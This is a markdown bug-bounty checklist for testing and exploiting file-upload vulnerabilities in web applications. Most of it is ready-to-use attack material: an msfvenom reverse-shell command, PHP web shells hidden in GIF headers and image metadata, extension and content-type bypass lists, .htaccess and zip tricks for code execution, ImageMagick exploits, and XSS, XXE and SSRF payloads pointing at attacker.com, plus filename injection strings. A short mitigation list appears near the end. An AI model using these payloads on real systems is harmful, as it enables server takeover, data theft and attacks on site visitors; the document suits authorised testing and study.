# Introduction

- File upload vulnerability is a noteworthy issue with online applications. If a web application has this type of vulnerability, an aggressor can upload a file with malicious code in it that can be executed on the server. An assailant may most likely put a phishing page into the site or mutilate it to uncover internal data of the web server to other people.
- Allowing file uploads by end-users, especially if done without a full understanding of the risks associated with it, is akin to opening the floodgates for server compromise. Naturally, despite the security concerns surrounding the ability for end-users to upload files, it is an increasingly common requirement in modern web applications.
- File uploads carry a significant risk that not many are aware of, or how to mitigate against abuses. Worst still, several web applications contain insecure, unrestricted file upload mechanisms.
- Make sure you read "**First Link in the Reference!!**" its a great blog then proceed further.

**What can you achieve by exploiting file-upload:**

- Remote code execution
- SSRF
- XSS
- LFI
- XXE
- Phishing
- Parameter pollution
- uploaders may disclose internal paths
- [SQL injection](https://security.stackexchange.com/questions/29014/are-image-uploads-also-vulnerable-to-sql-injection)
- DoS attack
- Many More...

**What extension can lead to what if uploaded successfully:**

- Extensions Impact
    - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
    - `SVG`: Stored XSS, SSRF, XXE
    - `GIF`: Stored XSS, SSRF
    - `CSV`: CSV injection
    - `XML`: XXE
    - `AVI`: LFI, SSRF
    - `HTML`, `JS` : HTML injection, XSS, Open redirect
    - `PNG`, `JPEG`: Pixel flood attack (DoS)
    - `ZIP`: RCE via LFI, DoS
    - `PDF`, `PPTX`: SSRF, BLIND XXE
    - `SCF` : RCE

## Types of Validation in File-Upload:

There several others too but this are the main 5 types others are like File Signature Validation,File Content Validation, File Storage Location which all comes in further protection.

### 1. Client-Side Validation:

- Client side validation is a type of validation which takes place before the inputs are actually
sent to the server. And it happens on the web browser by JavaScript, VBScript, or HTML5
attributes. Programmers use this type of validation to provide better user experience by
responding quickly at the browser level.
- For Example `Error only .jpg is allowed`

### 2. File Name Validation:

- File name validation is when the server validate the file that being uploaded by checking
its extension, this validation happens based on many methods, but two of the most popular
methods are Blacklisting File Extensions and Whitelisting File Extensions.
- Blacklisting File extensions is a type of protection where only a specific extensions are being
rejected from the server, Such as php, aspx. While Whitelisting File extensions is the exact
opposite, which is only a few file extensions are allowed to be uploaded to the server, Such as
jpg, jpeg, gif.

### 3. Content-type / MIME-type Validation:

- Content-Type validation is when the server validate the content of the file by checking the
MIME type of the file, which can be shown in the http request. For example, some image file
uploads validate the images uploaded by checking if the Content-Type of the file is an image type.
- For Example: `Content-type: image/png`

### 4. Content-Length Validation:

- Content-Length validation is when the server checks the length of the content of the
uploaded file and restricts a file size that can’t be exceeded, Although this type of validation is
not very popular, But it can be shown on some file uploads.
- For Example: `Not allow file size greater than 10 bytes`

### 5. Checking the Image Header:

- When image upload only is allowed, most web applications usually validate the image header by using a server-side function such as `getimagesize()` in PHP. When called, this function will return the size of an image. If the file is not a valid image, meaning that the file header is not that of an image, the function will return FALSE. Therefore, several web applications typically check if the function returns TRUE or FALSE and validate the uploaded file using this information.
- This can be bypassed by using magic numbers

[List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)

# Testing For File-Upload and Exploiting.

![https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp](https://blog.yeswehack.com/wp-content/uploads/mindmap.png.webp)

## Base Step

```markdown
1. Browse the site and find each upload functionality.
2. Start with basic test by simply uploading a web shell using Weevely
	`weevely generate <password> <path>`
																	OR
	 Use Msfvenom `msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.8 lport=4444 -f raw`
3. Try the extension bypasses if that fails
4. Try changing content-type to bypass
5. Try Magic number bypass 
6. Try Polygot or PNG IDAT chunks bypass
7. Finally if successful then upload small POC or exploit further.
```

## Test Case - 1: Blacklisting Bypass.

```markdown
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is blacklisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. Try all of this extension 

**PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
**ASP** → asp, .aspx, .cer, .asa
**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf
**Coldfusion** → .cfm, .cfml, .cfc, .dbm
**Using random capitalization** → .pHp, .pHP5, .PhAr

Find more in PayloadAllThings and https://book.hacktricks.xyz/pentesting-web/file-upload

4. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 2: Whitelisting Bypass

```markdown
1. Find the upload request and send it to the repeater
2. Now start testing which extension for the file is whitelisted, change the `filename=` Parameter

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.jpg"
Content-Type: application/x-php

3. Try all of this extension 

file.jpg.php
file.php.jpg
file.php.blah123jpg
file.php%00.jpg
file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.
file.php%00
file.php%20
file.php%0d%0a.jpg
file.php.....
file.php/
file.php.\
file.php#.png
file.
.html

4. If doesn't works then try to bruteforce using intruder which extension are accepted and try again
5. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 3: Content-type validation

```markdown
1. Find the upload request and send it to the repeater
2. Upload file.php and change the Content-type: application/x-php or Content-Type : application/octet-stream to Content-type: image/png or Content-type: image/gif or Content-type: image/jpg

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

3. If successful then exploit further, or there might be other type of validation or 
	 check so try other bypass.
```

## Test Case - 4: Content-Length validation

```markdown
1. Find the upload request and send it to the repeater
2. Try all three above bypass first, if they doesn't works then see if file size is been
	 checked. Try all four of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Try small file payload like 

<?=`$_GET[x]`?>   
<?=‘ls’;   Note : <? work for “short_open_tag=On” in php.ini ( Default=On )

4. Finally the request should look like this. if this worked then try to access this file
	 For Example: http://example.com/compromised_file.php?x=cat%20%2Fetc%2Fpasswd 

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

<?=`$_GET[x]`?>

5. Dont stop here, upload better shell and try to see if you can find something more 
	 critical like DB_.
```

## Test Case - 5: Content Bypass / Using Magic Bytes

```markdown
1. Find the upload request and send it to the repeater
2. Try all Four above bypass first, if they doesn't works then see if file content is been
	 checked. Try all five of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

3. Change the Content-Type: application/x-php to Content-Type: image/gif and Add the 
	 text "GIF89a;" before you shell-code.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system($_GET['cmd']); ?>

4. Try more from here https://en.wikipedia.org/wiki/List_of_file_signatures and change 
	 Content-Type: accordingly
5. If successful upload better Shell and POC, and see how can you increase critically.
```

## Test Case - 6: Magic Bytes and Metadata Shell

```markdown
1. Find the upload request and send it to the repeater
2. Try all above bypass first, if they doesn't works then see if file content is been
	 checked. Try all six of this case in combo for more success rate.

POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php

[...]

4. First Bypass Content-Type checks by setting the value of the 
	 Content-Type header to: image/png , text/plain , application/octet-stream
5. Introduce the shell inside the metadata using tool exiftool.

exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

6. Now try uploading this modified img.jpg
7. Exploit further to increase critically.
```

## Test Case - 7: Uploading Configuration Files

```markdown
1. Find the upload request and send it to the repeater
2. Now try to upload .htaccess file if the app is using php server or else
	 try to upload .config is app is using ASP server
3. If you can upload a .htaccess, then you can configure several things and 
	 even execute code (configuring that files with extension .htaccess can be executed).
	 Different .htaccess shells can be found here: https://github.com/wireghoul/htshells
																	OR
	 If you can upload .config files and use them to execute code. One way to do it 
	 is appending the code at the end of the file inside an HTML comment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config
	 More information and techniques to exploit this vulnerability here: https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
4. Try to exploit now that server config is changed upload the shell 
	 For example if you uploaded .htaccess file with 
	 AddType application/x-httpd-php .png in content this configuration would instruct 
	 the Apache HTTP Server to execute PNG images as though they were PHP scripts.
5. Now simply upload our php shell file with extension .png 
6. Done, try to exploit further.
```

## Test Case - 8: Try Zip Slip Upload

```markdown
1. Find the upload request and send it to the repeater
2. Now check if .zip file is allowed to upload 
3. If a site accepts .zip file, upload .php and compress it into .zip and upload it.
4. Now visit, site.com/path?page=zip://path/file.zip%23rce.php

If you also try this tool and info here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Zip%20Slip
```

## Test Case -9 : Try ImageMagick

```markdown
Check Reference : https://hackerone.com/reports/302885 , https://medium.com/@kunal94/imagemagick-gif-coder-vulnerability-leads-to-memory-disclosure-hackerone-e9975a6a560e
1. Find the upload functionality like profile pic upload.
2. Git clone https://github.com/neex/gifoeb in you system.
3. Goto gifoeb directory and run this command.

./gifoeb gen 512x512 dump.gif

   This will create exploitable dump.gif file where 512x512 is pixel dimension and 
	 dump.gif is an gif file.

   You can also try to bypass some checks.

	 a) ./gifoeb gen 1123x987 dump.jpg
	 b) ./gifoeb gen 1123x987 dump.png
	 c) ./gifoeb gen 1123x987 dump.bmp
	 d) ./gifoeb gen 1123x987 dump.tiff
	 e) ./gifoeb gen 1123x987 dump.tif

	(It will create the dump files with different extensions. Try with which site works)
4. After creation of exploitable files, just upload in the profile settings. 
	 using modified Image files.
5. Server will return different pixel files. Download this file.
6. Save and recover the pixel files.
	 
	for p in previews/*; do
    ./gifoeb recover $p | strings;
	done

7. More details here https://github.com/neex/gifoeb

########################### Another Different method #############################

Reference : https://www.exploit-db.com/exploits/39767 , https://hackerone.com/reports/135072

1. Find Upload functionality.
2. Make a file with .mvg extension and add below code in it.

push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context

Here example.com can be your burp collab url or your site were you can receive HTTP request.
3. Now use below command 

convert ssrf.mvg out.png

4. Upload the image and see if you received http request.

Find ready made and more payloads here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik
```

## Exploitation:

### XSS:

```markdown
There are multiple ways to achieve XSS.

1. Set file name filename="svg onload=alert(document.domain)>" , filename="58832_300x300.jpg<svg onload=confirm()>"
2. Upload using .gif file

GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;

3. Upload using .svg file

```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("HolyBugx XSS");
   </script>
</svg>
```
```

### OpenRedirection:

```markdown
Upload using .svg file

<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
```

### XXE:

```markdown
1. Upload using .svg file
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

```
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

2. Using excel file you can acheive not only XXE, but other vulnerability too.
https://medium.com/@rezaduty/security-issues-in-import-export-functionality-5d8e4b4e9ed3
```

### SSRF:

```markdown
1. Abusing the "Upload from URL", if this image is going to be saved in some public site, 
	 you could also indicate a URL from [IPlogger](https://iplogger.org/invisible/) and steal information of every visitor.

2. SSRF Through .svg file.

<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
```

### Command Injection:

```markdown
1. Set filename ; sleep 10;
```

### LFI:

```markdown
1. Set filename ../../etc/passwd/logo.png
2. Set filename ../../../logo.png as it might changed the website logo.
```

### SQL Injection:

```markdown
1. Set filename 'sleep(10).jpg
2. Set filename sleep(10)-- -.jpg
```

### DOS:

```markdown
1. Pixel flood attack using image, upload this image and Boom!!
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg
https://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Photo%20Viewer%20on%20my%20computer.

2. DoS with a large values name: 1234...99.png 
```

**SSTI:**

```python

```

# Mitigation

File upload functionality is not straightforward to implement securely. Some recommendations to consider in the design of this functionality include:

- Use a server-generated filename if storing uploaded files on disk.
- Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks.
- Enforce a whitelist of accepted, non-executable file extensions.
- If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.
- Enforce a size limit on uploaded files (for defense-in-depth, this can be implemented both within application code and in the web server’s configuration).
- Reject attempts to upload archive formats such as ZIP.

# Mind-Map

![File_Upload_MindMap](https://user-images.githubusercontent.com/33719912/193826710-b6d71979-04f4-42a6-a9c6-7d14784de9d4.png)


# Tools And Payload.

[barrracud4/image-upload-exploits](https://github.com/barrracud4/image-upload-exploits)

[almandin/fuxploider](https://github.com/almandin/fuxploider)

[PortSwigger/upload-scanner](https://github.com/PortSwigger/upload-scanner)

# Reference

[Interesting Test Cases of File uploading vulnerabilities](https://akash-venky091.medium.com/interesting-test-cases-of-file-uploading-vulnerabilities-3ad47f9e6149)

[File upload tricks and checklist](https://www.onsecurity.io/blog/file-upload-checklist)

[File Upload Attacks (Part 1) - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/exploitation/file-upload-attacks-part-1/)

[Unrestricted File Upload In PHP](https://medium.com/@nyomanpradipta120/unrestricted-file-upload-in-php-b4459eef9698)

[File Upload - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

[](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)

[Comprehensive Guide on Unrestricted File Upload](https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/)

[HolyBugx/HolyTips](https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md)

[Exploiting file upload vulnerabilities in web applications](https://infosecwriteups.com/web-application-analysis-exploiting-file-upload-vulnerabilities-cf48f79d51e)

[Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

[Art of Unrestricted File Upload Exploitation](https://bugdisclose.medium.com/art-of-unrestricted-file-upload-exploitation-92ed28796d0)

[File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)

[Encoding Web Shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

[Uploading Backdoor For Fun And Profit. (RCE + DB-cred = P1)](https://medium.com/@mohdaltaf163/uploading-backdoor-for-fun-and-profit-rce-db-cred-p1-2cdaa00e2125)

[Unrestricted File Uploading Vulnerability - Secnhack](https://secnhack.in/unrestricted-file-uploading-vulnerability/)

# Tips

```markdown
WAF bypass Tips by 
@0xInfection
Case: File Upload (.php blocked)

/?file=xx.php    <- Blocked
/?file===xx.php  <- Bypassed

The file got uploaded successfully.
```

[https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium](https://pbs.twimg.com/media/EpkPLYXVgAMLhZa?format=jpg&name=medium)

```markdown
Bypass File Upload Filtering

In image :

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg 

mv shell.jpg  shell.php.jpg
```

[https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900](https://pbs.twimg.com/media/Eq9dOoaXUAAEE8n?format=jpg&name=900x900)

## Author:
[KathanP19](https://twitter.com/KathanP19)
